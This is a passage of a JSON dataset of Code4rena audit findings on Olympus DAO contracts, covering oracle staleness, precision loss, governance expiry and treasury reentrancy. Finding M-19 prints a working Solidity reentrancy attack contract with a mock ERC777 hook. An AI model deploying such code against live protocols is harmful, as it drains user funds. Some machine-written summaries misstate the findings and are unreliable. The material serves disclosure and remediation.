      "impact": "MEDIUM",
      "content": "_Submitted by 0x52_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L363-L469><br>\n\nIncorrect initial bond market price.\n\n### Proof of Concept\n\n    uint256 initialPrice = range.wall.high.price.mulDiv(bondScale, oracleScale);\n\n    uint256 initialPrice = invWallPrice.mulDiv(bondScale, oracleScale);\n\nIn the above lines the initial prices are set to the wall price rather than the current price as indicated in documentation.\n\n### Recommended Mitigation Steps\n\nInitial price should be updated to open bond market at current price rather than wall price.\n\n**[Oighty (Olympus) disagreed with severity and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/485#issuecomment-1235667143):**\n > This is more of a design decision than a bug. However, we did make this change in the code prior to the audit (it didn't get reflected in the repo). @ind-igo not sure how you want to handle.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/485#issuecomment-1251683341):**\n > Going to award as Medium assuming no additional input from sponsor on the topic. \n\n**[Oighty (Olympus) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/485#issuecomment-1252616779):**\n > It does deviate from the spec so I guess that's appropriate. The system actually would work as-is, but would be less responsive to price movements into the cushions since the bond market would have to decay (which requires waiting) to reach the current market price vs. instantly providing a buy/sell at the current price.\n\n\n\n***\n\n",
      "summary": "\nA bug has been identified in the Operator.sol file of the 2022-08-olympus GitHub repository. This bug could cause incorrect initial bond market prices. The bug is located in lines 363-469 of the file. The incorrect initial price is set to the wall price rather than the current price as indicated in the documentation. The recommended mitigation step is to update the initial price to open the bond market at the current price rather than the wall price.",
      "quality_score": 3,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/485",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "0x52"
      ]
    },
    {
      "id": "3229",
      "title": "[M-25] Moving average precision is lost",
      "impact": "MEDIUM",
      "content": "_Submitted by hyh, also found by CertoraInc, d3e4, and rbserver_\n\nNow the precision is lost in moving average calculations as the difference is calculated separately and added each time, while it typically can be small enough to lose precision in the division involved.\n\nFor example, `10000` moves of `990` size, `numObservations = 1000`. This will yield `0` on each update, while must yield `9900` increase in the moving average.\n\n### Proof of Concept\n\nMoving average is calculated with the addition of the difference:\n\n<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L134-L139>\n\n```solidity\n        // Calculate new moving average\n        if (currentPrice > earliestPrice) {\n            _movingAverage += (currentPrice - earliestPrice) / numObs;\n        } else {\n            _movingAverage -= (earliestPrice - currentPrice) / numObs;\n        }\n```\n\n`/ numObs` can lose precision as `currentPrice - earliestPrice` is usually small.\n\nIt is returned on request as is:\n\n<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L189-L193>\n\n```solidity\n    /// @notice Get the moving average of OHM in the Reserve asset over the defined window (see movingAverageDuration and observationFrequency).\n    function getMovingAverage() external view returns (uint256) {\n        if (!initialized) revert Price_NotInitialized();\n        return _movingAverage;\n    }\n```\n\n### Recommended Mitigation Steps\n\nConsider storing the cumulative `sum`, while returning `sum / numObs` on request:\n\n<https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L189-L193>\n\n```solidity\n    /// @notice Get the moving average of OHM in the Reserve asset over the defined window (see movingAverageDuration and observationFrequency).\n    function getMovingAverage() external view returns (uint256) {\n        if (!initialized) revert Price_NotInitialized();\n-       return _movingAverage;\n+       return _movingAverage / numObservations;\n    }\n```\n\n**[Oighty (Olympus) disagreed with severity and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/483#issuecomment-1238433469):**\n > Keeping track of the observations as a sum and then dividing is a good suggestion. The price values have 18 decimals and the max discrepancy introduced is very small (10**-15) with expected parameter ranges. The potential risk to the protocol seems low though.\n\n**[hyh (warden) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/483#issuecomment-1240994248):**\n > Please notice that discrepancy here is unbounded, i.e. the logic itself does not have any max discrepancy, the divergence between fact and recorded value can pile up over time without a limit.\n> \n> If you do imply that markets should behave in some way that minuses be matched with pluses, then I must say that they really shouldn't.\n\n**[Oighty (Olympus) confirmed](https://github.com/code-423n4/2022-08-olympus-findings/issues/483)**\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/483#issuecomment-1249930031):**\n > Debating between QA and Medium on this one. I am going to award it as medium because there is a potential to leak some value due to this imprecision compounding over time. \n\n\n\n***\n\n",
      "summary": "\nA bug report has been issued for the code found in the GitHub repository https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/modules/PRICE.sol#L134-L139. The vulnerability is that the precision is lost in moving average calculations as the difference is calculated separately and added each time, while it typically can be small enough to lose precision in the division involved. It is demonstrated with an example of `10000` moves of `990` size, `numObservations = 1000` which should yield `9900` increase in the moving average, but instead yields `0`.\n\nThe bug report suggests that the cumulative `sum` should be stored, while returning `sum / numObs` on request. This can be achieved by replacing the `return _movingAverage` line in the code with the line `return _movingAverage / numObservations`. This change should prevent the precision from being lost and ensure the moving average is calculated correctly.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/483",
      "tags": [
        "Precision Loss"
      ],
      "finders": [
        "CertoraInc",
        "d3e4",
        "hyh",
        "rbserver"
      ]
    },
    {
      "id": "3228",
      "title": "[M-24] [NAZ-M1] Chainlink's `latestRoundData` Might Return Stale Results",
      "impact": "MEDIUM",
      "content": "_Submitted by 0xNazgul, also found by &#95;&#95;141345&#95;&#95;, 0x1f8b, ak1, brgltd, cccz, csanuragjain, Dravee, Guardian, hyh, IllIllI, itsmeSTYJ, Jujic, Lambda, pashov, peachtea, rbserver, reassor, Sm4rty, TomJ, and zzzitron_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L161><br>\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L170><br>\n\nAcross these contracts, you are using Chainlink's `latestRoundData` API, but there is only a check on `updatedAt`. This could lead to stale prices according to the Chainlink documentation:\n\n*   [Historical Price data](https://docs.chain.link/docs/historical-price-data/#historical-rounds)\n*   [Checking Your returned answers](https://docs.chain.link/docs/faq/#how-can-i-check-if-the-answer-to-a-round-is-being-carried-over-from-a-previous-round)\n\nThe result of `latestRoundData` API will be used across various functions, therefore, a stale price from Chainlink can lead to loss of funds to end-users.\n\n### Recommended Mitigation Steps\n\nConsider adding the missing checks for stale data.\n\nFor example:\n\n```js\n(uint80 roundID ,answer,, uint256 timestamp, uint80 answeredInRound) = AggregatorV3Interface(chainLinkAggregatorMap[underlying]).latestRoundData();\n\nrequire(answer > 0, \"Chainlink price <= 0\"); \nrequire(answeredInRound >= roundID, \"Stale price\");\nrequire(timestamp != 0, \"Round not complete\");\n```\n\n**[Oighty (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/441#issuecomment-1238528515):**\n > Agree. We'll add the additional checks.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability that could lead to loss of funds to end-users. The vulnerability is caused by the use of Chainlink's `latestRoundData` API without a check on `updatedAt`. This could lead to the use of stale prices across various functions. Manual review was used to detect the vulnerability. To mitigate this vulnerability, it is recommended to add checks for stale data, such as checking that the answer to a round is being carried over from a previous round, and that the round is complete. This should ensure that the correct, up-to-date data is used.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/441",
      "tags": [
        "Chainlink",
        "Oracle",
        "Stale Price"
      ],
      "finders": [
        "Jujic",
        "brgltd",
        "pashov",
        "0xNazgul",
        "Guardian",
        "rbserver",
        "TomJ",
        "Lambda",
        "itsmeSTYJ",
        "0x1f8b",
        "Sm4rty",
        "csanuragjain",
        "IllIllI",
        "reassor",
        "cccz",
        "peachtea",
        "zzzitron",
        "ak1",
        "__141345__",
        "Dravee",
        "hyh"
      ]
    },
    {
      "id": "3227",
      "title": "[M-23] Treasury module is vulnerable to cross-contract reentrancy",
      "impact": "MEDIUM",
      "content": "_Submitted by Czar102_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L108-L112><br>\n\nAn attacker can pay back their loan to the treasury module with protocol-owned tokens. This will cause their loan to decrease despite the protocol won't be given funds for it.\n\n### Proof of Concept\n\nThe code first measures the number of tokens in the treasury, then transfers an amount to the contract and checks the change it caused. This is put behind a nonReentrant modifier so that one can't use the same balance change to pay back multiple parts of (potentially) multiple loans.\n\nThe problem arises when the treasury doesn't only claim tokens from paying back loans, but also claims protocol revenue. Since, an attacker can gain execution in the moment the funds are pulled to the treasury to trigger any function that grants treasury this type of tokens (collects protocol revenue). The contract will count these tokens as paying back one's loan since this happened between balance measurements.\n\n### Recommended Mitigation Steps\n\nAdd a function used to pull a token to the contract and mark it nonReentrant. Any transfer of tokens to the treasury should be done through that function.\n\n**[ind-igo (Olympus) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/426#issuecomment-1240219578):**\n > I am confused by this submission. Need more information.\n\n**[ind-igo (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/426#issuecomment-1244569278):**\n > Spoke with Czar, solution for minimal change is adding `received = min(received, amount_); `. Confirming issue.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in a code that allows an attacker to pay back their loan to the treasury module with protocol-owned tokens without the protocol receiving funds for it. This is possible because the code measures the number of tokens in the treasury, then transfers an amount to the contract and checks the change it caused. This is put behind a nonReentrant modifier so that one can't use the same balance change to pay back multiple parts of (potentially) multiple loans.\n\nThe vulnerability arises when the treasury doesn't only claim tokens from paying back loans, but also claims protocol revenue. An attacker can gain execution in the moment the funds are pulled to the treasury to trigger any function that grants treasury this type of tokens (collects protocol revenue). The contract will count these tokens as paying back one's loan since this happened between balance measurements.\n\nThe recommended mitigation is to add a function used to pull a token to the contract and mark it nonReentrant. Any transfer of tokens to the treasury should be done through that function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/426",
      "tags": [],
      "finders": [
        "Czar102"
      ]
    },
    {
      "id": "3226",
      "title": "[M-22] Low market bonds/swaps not working after loan is taken from treasury",
      "impact": "MEDIUM",
      "content": "_Submitted by immeas_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L60><br>\n\nI am bordering between this being medium and low, but since this is, granted under very unlikely circumstances, hindering intended transfers to work I am submitting it as medium. That said, I don't think this scenario is very likely since it requires a trusted contract not part of initial release(? no contract in repo used a loan) to take a large loan from TRSRY.\n\n### Proof of Concept\n\nThis will cause test to fail on `TRANSFER_FAILED` due to TRSRY not having the tokens to transfer but `getReserveBalance` says it has, since capacity is determined based on non-existing tokens.\n\n```diff\ndiff --git a/src/test/policies/Operator.t.sol b/src/test/policies/Operator.t.sol\nindex e09aec1..5c1e95f 100644\n--- a/src/test/policies/Operator.t.sol\n+++ b/src/test/policies/Operator.t.sol\n@@ -26,6 +26,8 @@ import {OlympusMinter, OHM} from \"modules/MINTR.sol\";\n import {Operator} from \"policies/Operator.sol\";\n import {BondCallback} from \"policies/BondCallback.sol\";\n \n+import {ModuleTestFixtureGenerator} from \"test/lib/ModuleTestFixtureGenerator.sol\";\n+\n contract MockOhm is ERC20 {\n     constructor(\n         string memory _name,\n@@ -45,6 +47,7 @@ contract MockOhm is ERC20 {\n // solhint-disable-next-line max-states-count\n contract OperatorTest is Test {\n     using FullMath for uint256;\n+    using ModuleTestFixtureGenerator for OlympusTreasury;\n \n     UserFactory public userCreator;\n     address internal alice;\n@@ -53,6 +56,9 @@ contract OperatorTest is Test {\n     address internal policy;\n     address internal heart;\n \n+    address public debtor;\n+    address public godmode; \n+\n     RolesAuthority internal auth;\n     BondAggregator internal aggregator;\n     BondFixedTermTeller internal teller;\n@@ -187,6 +193,18 @@ contract OperatorTest is Test {\n \n         reserve.mint(address(treasury), testReserve * 100);\n \n+        debtor = treasury.generateFunctionFixture(treasury.getLoan.selector);\n+        godmode = treasury.generateGodmodeFixture(type(OlympusTreasury).name);\n+        \n+        kernel.executeAction(Actions.ActivatePolicy, godmode);\n+        kernel.executeAction(Actions.ActivatePolicy, debtor);\n+        \n+        vm.prank(godmode);\n+        treasury.setApprovalFor(debtor, reserve, testReserve * 100);\n+\n+        vm.prank(debtor);\n+        treasury.getLoan(reserve,testReserve*100);\n+\n         // Approve the operator and bond teller for the tokens to swap\n         vm.prank(alice);\n         ohm.approve(address(operator), testOhm * 20);\n```\n\nSame is applicable for low market bonds since they are created based on the same capacity.\n\n### Tools Used\n\nvs code + tests\n\n### Recommended Mitigation Steps\n\nDetermine capacity from actual tokens held by treasury.\n\n**[ind-igo (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/422#issuecomment-1238768525):**\n > Acknowledged. Will add a reserve requirement check inside the TRSRY's debt functions, which we can expand with a policy to rebalance if out of balance on a heartbeat.\n\n\n\n***\n\n",
      "summary": "\nA bug was discovered in the code of a GitHub repository, which affects the functioning of low market bonds/swaps after a loan is taken from the TRSRY. This bug is considered low in impact as it is unlikely to occur, but it still hinders the intended transfers. The bug was discovered when a test failed on TRANSFER_FAILED due to TRSRY not having the tokens to transfer, though the 'getReserveBalance' said it had, since capacity was determined based on non-existing tokens. The tools used to identify this bug were VS Code and tests.\n\nThe recommended mitigation step to fix this bug is to determine capacity from the actual tokens held by the treasury.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/422",
      "tags": [],
      "finders": [
        "immeas"
      ]
    },
    {
      "id": "3225",
      "title": "[M-21] OlympusGovernance - active proposal does not expire",
      "impact": "MEDIUM",
      "content": "_Submitted by reassor_\n\nContract `OlympusGovernance` allows controlling protocol through on-chain governing. The issue is that once proposal is active it does not expire, which means that until the new proposal will be selected, anyone can vote on existing one and potentially execute it when it might cause harm to the protocol.\n\nScenario:\n\n1.  New proposal has been submited, endorsed and activated.\n2.  Users vote, but the quroum is not being achieved.\n3.  The proposal is active until new one is getting submitted.\n4.  6 months elapses and the current active proposal might cause serious harm to the protocol (since it was created long time ago).\n5.  Malicious actor votes and executes proposal causing harm to the protocol.\n\n### Proof of Concept\n\n`Governance.sol`:\n\n*   <https://github.com/code-423n4/2022-08-olympus/blob/2a0b515012b4a40076f6eac487f7816aafb8724a/src/policies/Governance.sol#L265-L289>\n\n### Tools Used\n\nManual Review / VSCode\n\n### Recommended Mitigation Steps\n\nIt is recommended to add expiration for the active proposal for example 2 weeks. After that time it should be possible to reject proposal and users should be able to reclaim VOTES tokens.\n\n**[fullyallocated (Olympus) disputed](https://github.com/code-423n4/2022-08-olympus-findings/issues/100)**\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/100#issuecomment-1251712619):**\n > I believe the warden is simply stating that an active proposal stays active if not replaced.  There is not expiration of a proposal once it becomes active, so theoretically if the governance process is inactive a very stale proposal could get executed. \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the vulnerability in Contract OlympusGovernance which allows controlling protocol through on-chain governing. The issue is that once a proposal is active, it does not expire, meaning that until a new proposal is selected, anyone can vote on the existing one and potentially execute it when it might cause harm to the protocol. \n\nA proof of concept example is given in which a malicious actor votes and executes a proposal causing harm to the protocol. The lines of code associated with the vulnerability are provided in the report and it is recommended to add an expiration for the active proposal, for example two weeks, so that users can reclaim their VOTES tokens. \n\nIn conclusion, this bug report is about a vulnerability in Contract OlympusGovernance which allows anyone to vote on and execute a proposal which might have been active for a long time and cause harm to the protocol. It is recommended to add an expiration period for active proposals to mitigate this vulnerability.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/100",
      "tags": [],
      "finders": [
        "reassor"
      ]
    },
    {
      "id": "3224",
      "title": "[M-20] Operator: if WallSpread is 10000, `operate` and `beat` will revert and price information cannot be updated anymore",
      "impact": "MEDIUM",
      "content": "_Submitted by zzzitron_\n\nThe `beat` cannot be called anymore and price information will not be updated\n\nCondition:\n\n*   the wallspread is set to 10000 (100%)\n*   lower wall is active (range.low\\.active==true)\n*   the price falls into the lower cushion (currentPrice < range.cushion.low\\.price && currentPrice > range.wall.low\\.price), therefore activates the lower bond market\n\n### Proof of Concept\n\nThe below proof of concept demonstrates that the `operate` will revert with 100% wallspread. The full test code can be found [here](https://gist.github.com/zzzitron/74dfbc0249151a682061cd6532628d87) as well as [the diff from `Operator.t.sol`](https://gist.github.com/zzzitron/216d67cc0c7def5450b921f9c7f9ae91).\n\nIn the test, the wallspread was set to 10000, which is 100% (line 51). The price was set so that the lower market should be deployed (line 59). In the market deployment logic (`Operator::_activate`) will revert due to division by zero, and `operate` will fail.\n\nOnce this condition is met, the `operate` cannot be called and `Heart::beat` cannot be called as well, since the `Heart::beat` is calling `Operator::opearate` under the hood. As the result the price can never be updated. But other codes who uses the price information will not know that the price information is stale. If the upper wall is active and still have the capacity, one can swap from the upper wall using the stale information, which might cause some loss of funds.\n\n```solidity\n    function test_poc__lowCushionDeployWithWallspread10000Reverts() public {\n        /// Initialize operator\n        vm.prank(guardian);\n        operator.initialize();\n\n        /// if the wallspread is 10000 the operate might revert\n        vm.prank(policy);\n        operator.setSpreads(7000, 10000);\n\n        /// Confirm that the cushion is not deployed\n        assertTrue(!auctioneer.isLive(range.market(true)));\n\n        /// Set price on mock oracle into the lower cushion\n        /// given the lower wallspread is 10000\n        /// when the lower market should be deployed the operate reverts\n        price.setLastPrice(20 * 1e18);\n\n        /// Trigger the operate function manually\n        /// The operate will revert Error with \"Division or modulo by 0\"\n        /// But I could not figure out to catch with `expectRevert`\n        /// so just commenting out the assert\n        // vm.prank(guardian);\n        // /// vm.expectRevert(bytes(\"Division or module by 0\"));   // this cannot catch the revert...\n        // operator.operate();\n    }\n```\n\n### Cause\n\nThe main cause is that the `RANGE::setSpreads` function fails to check for `wallSpread_ == 10000`. If the setter does not allow the wallSpread to be 100%, the price of the lower wall will not go to zero.\n\n```solidity\n// modules/RANGE.sol\n// https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L242-L250\n\n242     function setSpreads(uint256 cushionSpread_, uint256 wallSpread_) external permissioned {\n243         // Confirm spreads are within allowed values\n244         if (\n245             wallSpread_ > 10000 ||\n246             wallSpread_ < 100 ||\n247             cushionSpread_ > 10000 ||\n248             cushionSpread_ < 100 ||\n249             cushionSpread_ > wallSpread_\n250         ) revert RANGE_InvalidParams();\n```\n\nIn the `RANGE::updatePrices`, the price of lower wall will be zero if the wallSpread is 100%.\nIf the price of lower wall is zero, the `Operator::_activate` will fail for the lower cushion.\n\n```solidity\n// policies/Operator.sol::_activate(bool high_)\n// when high_ is false\n421             uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price;\n\n// modules/RANGE.sol::updatePrices\n164         _range.wall.low.price = (movingAverage_ * (FACTOR_SCALE - wallSpread)) / FACTOR_SCALE;\n```\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nMitigation suggestion: line 245. Forbid wallSpread to be 100%.\n\n```solidity\n// modules/RANGE.sol\n// https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/RANGE.sol#L242-L250\n\n242     function setSpreads(uint256 cushionSpread_, uint256 wallSpread_) external permissioned {\n243         // Confirm spreads are within allowed values\n244         if (\n-245            wallSpread_ > 10000 ||\n+               wallSpread_ >= 10000 ||\n246             wallSpread_ < 100 ||\n247             cushionSpread_ > 10000 ||\n248             cushionSpread_ < 100 ||\n249             cushionSpread_ > wallSpread_\n250         ) revert RANGE_InvalidParams();\n```\n\n**[Oighty (Olympus) disagreed with severity and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/404#issuecomment-1238554404):**\n > This is indeed an edge case and we will update the value checks for the spread values to exclude `10000`. However, from a practical perspective, this is very unlikely to happen. If the goal is to set the lower wall to 0, then the system would just be disabled.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/404#issuecomment-1251657272):**\n > Given the warden does fully demonstrate the issue, I am going to award as Medium with the understanding that this is an extreme edge case. \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of the project 2022-08-olympus. When the wallspread is set to 10000 (100%) and the lower wall is active, the price falls into the lower cushion and activates the lower bond market, causing the function `beat` to not be called anymore and the price information to not be updated. The proof of concept demonstrates this, and the main cause is that the `RANGE::setSpreads` function fails to check for `wallSpread_ == 10000`. If the setter does not allow the wallSpread to be 100%, the price of the lower wall will not go to zero, thus preventing the `Operator::_activate` from failing. The recommended mitigation step is to forbid wallSpread to be 100%. This can be done by changing line 245 of the `RANGE::setSpreads` function, from `wallSpread_ > 10000` to `wallSpread_ >= 10000`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/404",
      "tags": [],
      "finders": [
        "zzzitron"
      ]
    },
    {
      "id": "3223",
      "title": "[M-19] TRSRY: reenter from `OlympusTreasury::repayLoan` to `Operator::swap`",
      "impact": "MEDIUM",
      "content": "_Submitted by zzzitron_\n\nOne can repay loan to the treasury with the value from the `Operator::swap`.\n\nCondition:\n\n*   the reserve token in Operator has hook for sender (like ERC777)\n*   the debt is the same token as reserve\n\n### Proof of Concept\n\nThe below code snippet shows a part of proof of concept for reentrancy attack, which is based on `src/test/policies/Operator.t.sol`. The full test code can be found [here](https://gist.github.com/zzzitron/651e1451ac1ff21be8a72b502b26f7cb), and [git diff from the `Operator.t.sol`](https://gist.github.com/zzzitron/5b8ebe635ed1939f18a100c7940b4f11).\n\nLet's say that the reserve token implements ERC777 with the hook for the sender [(see weird erc20)](https://github.com/d-xo/weird-erc20#reentrant-calls). If the attacker can take debt of the reserve currency for the attack contract `Reenterer`, the contract can call `OlympusTreasury::repayLoan` and in the middle of repay call `Operator::swap` function. The `swap` function will modify the reserve token balance of treasury and the amount the attacker swapped will be also be used for the `repayLoan`.\n\nIn the below example, the attacker has debt of 1e18, and repays 1e17. But since the `swap` function is called in the `repayLoan`, the debt is reduced 1e17 more then it should. And the swap happened as expected so the attack has the corresponding ohm token.\n\n```solidity\n/// Mock to simulate the senders hook\n/// for simplicity omitted the certain aspects like ERC1820 registry and etc.\ncontract MockERC777 is MockERC20 {\n    constructor () MockERC20(\"ERC777\", \"777\", 18) {}\n\n    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {\n        _callTokenToSend(from, to, amount);\n        return super.transferFrom(from, to, amount);\n        // _callTokenReceived(from, to, amount);\n    }\n\n    // simplified implementation for ERC777\n    function _callTokenToSend(address from, address to, uint256 amount) private {\n      if (from != address(0)) {\n        IERC777Sender(from).tokensToSend(from, to, amount);\n      }\n    }\n}\n\ninterface IERC777Sender {\n  function tokensToSend(address from, address to, uint256 amount) external;\n}\n\n/// Concept for an attack contract\ncontract Reenterer is IERC777Sender {\n  ERC20 public token;\n  Operator public operator;\n  bool public entered;\n\n  constructor(address token_, Operator op_) {\n    token = ERC20(token_);\n    operator = op_;\n  }\n\n  function tokensToSend(address from, address to, uint256 amount) external override {\n    if (!entered) {\n    // call swap from reenter\n    // which will manipulate the balance of treasury\n      entered = true;\n      operator.swap(token, 1e17, 0);\n    }\n  }\n  \n  function attack(OlympusTreasury treasury) public {\n    // approve to the treasury\n    token.approve(address(treasury), 1e18);\n    token.approve(address(operator), 100* 1e18);\n\n    // repayDebt of 1e17\n    treasury.repayLoan(token, 1e17);\n  }\n}\n```\n\n```solidity\n/// the test\n    function test_poc__reenter() public {\n        vm.prank(guardian);\n        operator.initialize();\n\n      reserve.mint(address(reenterer), 1e18);\n      assertEq(treasury.reserveDebt(reserve, address(reenterer)), 1e18);\n      // start repayLoan\n      reenterer.attack(treasury);\n      // it should be 9 * 1e17 but it is 8 * 1e17\n      assertEq(treasury.reserveDebt(reserve, address(reenterer)), 8*1e17);\n    }\n```\n\n### Cause\n\nThe `repayLoan`, in the line 110 below,  calls the `safeTransferFrom`. The balance before and after are compared to determine how much of debt is paid. So, if the `safeTranferFrom` can modify the balance, the attacker can profit from it.\n\n```solidity\n// OlympusTreasury::repayLoan\n// https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L105-L112\n105     function repayLoan(ERC20 token_, uint256 amount_) external nonReentrant {\n106         if (reserveDebt[token_][msg.sender] == 0) revert TRSRY_NoDebtOutstanding();\n107\n108         // Deposit from caller first (to handle nonstandard token transfers)\n109         uint256 prevBalance = token_.balanceOf(address(this));\n110         token_.safeTransferFrom(msg.sender, address(this), amount_);\n111\n112         uint256 received = token_.balanceOf(address(this)) - prevBalance;\n```\n\nIn the `swap` function, if the amount in token is reserve, the payment token to buy ohm will be paid to the treasury. It gives to an opportunity to modify the balance.\n\n```solidity\n// Operator::swap\n// https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L330\n329             /// Transfer reserves to treasury\n330             reserve.safeTransferFrom(msg.sender, address(TRSRY), amountIn_);\n```\n\nAlthough both of `Operator::swap` and `OlympusTreasury::repayLoan` have `nonReentrant` modifier, it does not prevent as they are two different contracts.\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nThe deposit logic in the `OlympusTreasury::repayLoan` was trying to handle nonstandard tokens, such as fee-on-transfer. But by doing so introduced an attack vector for tokens with ERC777. If the reserve token should be decided in the governance, it should be clarified, which token standards can be used safely.\n\n**[ind-igo (Olympus) confirmed and commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/403#issuecomment-1241204868):**\n > Good report, although very low risk as the preconditions are extremely unlikely. Will take into account the suggestion by adding a comment to the function. Thank you.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-08-olympus-findings/issues/403#issuecomment-1251655815):**\n > I would probably downgrade to QA, but the warden does a good job of proving the point out with examples.  Will leave as Medium.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the code of the OlympusTreasury and Operator contracts, which is part of a Github repository. It allows an attacker to repay loan to the treasury with the value from the Operator::swap function. This is possible if the reserve token in Operator has a hook for the sender, like ERC777, and the debt is the same token as reserve. The code snippet provided shows a proof of concept for the reentrancy attack. The attack works by the attacker taking debt of the reserve currency and then calling the OlympusTreasury::repayLoan and in the middle of the repay call the Operator::swap function. This causes the debt to be reduced more than it should, and the swap happens as expected, so the attack has the corresponding ohm token. \n\nThe cause of this vulnerability is that the repayLoan calls the safeTransferFrom, which can modify the balance, and the swap function pays the payment token to buy ohm to the treasury. Even though both of the Operator::swap and OlympusTreasury::repayLoan have the nonReentrant modifier, it does not prevent as they are two different contracts.\n\nThe recommended mitigation step is that if the reserve token should be decided in the governance, it should be clarified which token standards can be used safely.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Olympus DAO",
      "source_link": "https://code4rena.com/reports/2022-08-olympus",
      "github_link": "https://github.com/code-423n4/2022-08-olympus-findings/issues/403",
      "tags": [],
      "finders": [
        "zzzitron"
      ]
    },
    {
      "id": "3222",
      "title": "[M-18] Inconsistency in staleness checks between OHM and reserve token oracles",
      "impact": "MEDIUM",
      "content": "_Submitted by okkothejawa, also found by datapunk, reassor, and Trust_\n\n<https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L165-L171><br>\n\nPrice oracle may fail and revert due to the inconsistency in the staleness checks.\n\n### Proof of Concept\n\nIn the `getCurrentPrice()` of `PRICE.sol`, Chainlink oracles are used to get the price of OHM against a reserve token, and a staleness check is used to make sure the price oracles are reporting fresh data. Yet the freshness requirements are inconsistent, for OHM, `updatedAt` should be lower than current timestamp minus three times the observation frequency, while for the reserve price, it is required that `updatedAt` should be lower than current timestamp minus the observation frequency. Our understanding is that that frequency is multiplied by 3 so that there can be some meaningful room where price data is accepted, as the time frame of only observation frequency (multiplied by 1) may not be enough for the oracle to realistically update its data.  (In other words, the frequency of new price information might be lower than the observation frequency, which is probably the case as third multiple is used for the OHM price).  If this is the case, this inconsistency may lead to the `getCurrentPrice()` reverting as while third multiple of the observation frequency might give enough space for the first oracle, second oracle's first multiple of frequency time frame might not be enough and it couldn't pass the staleness check due to unrealistic expectation of freshness.\n\n### Tools Used\n\nManual review, talking with devs\n\n### Recommended Mitigation Steps\n\nChange the line 171 to\n\n                if (updatedAt < 